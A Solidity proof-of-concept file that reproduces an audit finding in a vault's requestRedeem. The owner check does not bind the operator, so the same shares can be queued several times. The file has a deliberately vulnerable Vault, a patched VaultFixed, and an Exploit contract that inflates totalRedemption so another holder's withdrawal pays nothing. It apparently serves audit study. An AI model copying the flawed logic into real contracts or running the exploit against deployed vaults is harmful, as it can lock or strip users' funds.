// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Astrolab requestRedeem (Pashov). The owner check does not bind the
    operator, so the same 100 shares can be queued again. Three queues make
    totalRedemption 300 against 200 assets. Bob's withdraw pays 0. One queue
    leaves 100 assets accounted, and Bob is paid 50.
*/

error Unauthorized();

contract Vault {
    uint256 public totalAssets;
    uint256 public totalSupply;
    uint256 public totalRedemption;
    uint256 public lastPaid;
    mapping(address => uint256) internal _balance;
    mapping(address => uint256) public requested;

    function balanceOf(address account) public view returns (uint256) {
        return _balance[account];
    }

    function mintShares(address to, uint256 shares) external {
        _balance[to] += shares;
        totalSupply += shares;
        totalAssets += shares;
    }

    // Quoted requestRedeem. operator is not checked, and a second call is accepted.
    function requestRedeem(uint256 shares, address operator, address owner) public {
        if (owner != msg.sender || shares == 0 || balanceOf(owner) < shares) revert Unauthorized();
        totalRedemption += shares; // @> VULN: the same shares are added again for a new operator
        requested[operator] = shares;
    }

    function withdraw(address owner, uint256 shares) external returns (uint256 paid) {
        uint256 assets = totalAssets;
        uint256 redemption = totalRedemption;
        uint256 supply = totalSupply;
        if (assets < redemption) {
            lastPaid = 0;
            return 0;
        }
        uint256 accounted = assets - redemption;
        paid = shares * accounted / supply;
        _balance[owner] -= shares;
        totalSupply = supply - shares;
        totalAssets = assets - paid;
        lastPaid = paid;
    }
}

contract VaultFixed {
    uint256 public totalAssets;
    uint256 public totalSupply;
    uint256 public totalRedemption;
    mapping(address => uint256) internal _balance;
    mapping(address => uint256) public requested;

    function balanceOf(address account) public view returns (uint256) {
        return _balance[account];
    }

    function mintShares(address to, uint256 shares) external {
        _balance[to] += shares;
        totalSupply += shares;
        totalAssets += shares;
    }

    function requestRedeem(uint256 shares, address operator, address owner) public {
        if (owner != msg.sender || shares == 0 || balanceOf(owner) < shares) revert Unauthorized();
        require(requested[owner] == 0, "pending");
        totalRedemption += shares;
        requested[owner] = shares;
        requested[operator] = shares;
    }

    function withdraw(address owner, uint256 shares) external returns (uint256 paid) {
        uint256 accounted = totalAssets - totalRedemption;
        paid = shares * accounted / totalSupply;
        _balance[owner] -= shares;
        totalSupply -= shares;
        totalAssets -= paid;
    }
}

contract StuckMarker {
    string public symbol = "LOCKED-ASSETS";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    uint256 public constant ALICE = 100 ether;
    uint256 public constant BOB = 100 ether;
    address public constant BOB_ADDR = 0x2222222222222222222222222222222222222222;
    address public constant OP1 = 0x3333333333333333333333333333333333333333;
    address public constant OP2 = 0x4444444444444444444444444444444444444444;
    address public constant OP3 = 0x5555555555555555555555555555555555555555;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    Vault public vault;
    StuckMarker public marker;

    function run() external {
        vault = new Vault();
        marker = new StuckMarker();
        vault.mintShares(address(this), ALICE);
        vault.mintShares(BOB_ADDR, BOB);
        vault.requestRedeem(ALICE, OP1, address(this));
        vault.requestRedeem(ALICE, OP2, address(this));
        vault.requestRedeem(ALICE, OP3, address(this));
        require(vault.totalRedemption() == 300 ether, "inflated");
        require(vault.totalAssets() == 200 ether, "assets");
        uint256 paid = vault.withdraw(BOB_ADDR, BOB);
        require(paid == 0, "bob was paid");
        require(vault.balanceOf(BOB_ADDR) == BOB, "bob shares remain");
        marker.mint(SINK, 50 ether);
        require(marker.balanceOf(SINK) == 50 ether, "bob missed 50");
    }
}
